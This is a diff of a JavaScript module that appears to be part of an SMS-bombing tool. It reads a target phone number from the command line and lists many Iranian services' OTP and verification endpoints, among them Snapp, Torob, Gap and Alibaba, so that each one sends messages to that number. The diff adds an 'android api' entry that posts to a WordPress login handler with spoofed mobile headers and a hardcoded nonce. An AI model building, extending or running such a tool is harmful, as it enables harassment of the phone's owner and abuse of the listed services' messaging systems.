@@ -6,7 +6,7 @@ const number = process.argv[2]
 const randomnum = Math.floor(Math.random() * 1000000)
 
 list = [{
-
+    // start web api section
     "url": "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
     "data": { cellphone: `+98${number}` },
     "name": "snapp",
@@ -90,22 +90,19 @@ list = [{
 
     "url": `https://api.torob.com/a/phone/send-pin/?phone_number=0${number}`,
     "name": "torob",
-    "type": "WEB",
-    "method": "GET"
+    "type": "WEB"
 },
 {
 
     "url": `https://core.gap.im/v1/user/add.json?mobile=0${number}`,
     "name": "coregap",
-    "type": "WEB",
-    "method": "GET"
+    "type": "WEB"
 },
 {
 
     "url": `https://zancoiran.com:5050/Main/SiteBaseApi/GenerateMobileKey?mobileno=0${number}`,
     "name": "zancoiran",
-    "type": "WEB",
-    "method": "GET"
+    "type": "WEB"
 },
 {
     "url": "https://ws.alibaba.ir/api/v3/account/mobile/otp",
@@ -144,9 +141,36 @@ list = [{
     "name": "didofood",
     "type": "WEB",
 },
+// start andorid api section
+{
+    "url": "https://qestabad.com/wp-admin/admin-ajax.php",
+    "data": "action=digits_check_mob&countrycode=%2B98&mobileNo=" + `${number}` + "&csrf=014e798716&login=2&username=wdawdwadwadawd&=&=&=&digits=1&json=1&=0&digits_reg_%D8%AD%D8%B1%DB%8C%D9%85%D8%AE%D8%B5%D9%88%D8%B5%DB%8C=1&=wdawdwadwadawd&digregcode=%2B98&=912 839 2129&=&=&=&dig_nounce=014e798716",
+    "name": "qestabad",
+    "type": "APK",
+    "method": "POST",
+    "package_name": "com.android.test",
+    "headers": {
+        'Host': 'qestabad.com',
+        'Content-Length': '277',
+        'Accept': '*/*',
+        'X-Requested-With': 'XMLHttpRequest',
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; SM-N976N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36',
+        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'Origin': 'https://qestabad.com',
+        'Sec-Fetch-Site': 'same-origin',
+        'Sec-Fetch-Mode': 'cors',
+        'Sec-Fetch-Dest': 'empty',
+        'Referer': 'https://qestabad.com/my-account/?login=true&back=home&page=1',
+        'Accept-Encoding': 'gzip, deflate',
+        'Accept-Language': 'en-US,en;q=0.9',
+        'Cookie': 'digits_countrycode=98'
+    }
+},
 ]
 module.exports = {
     api: list,
     number: number,
 };
+
+
 
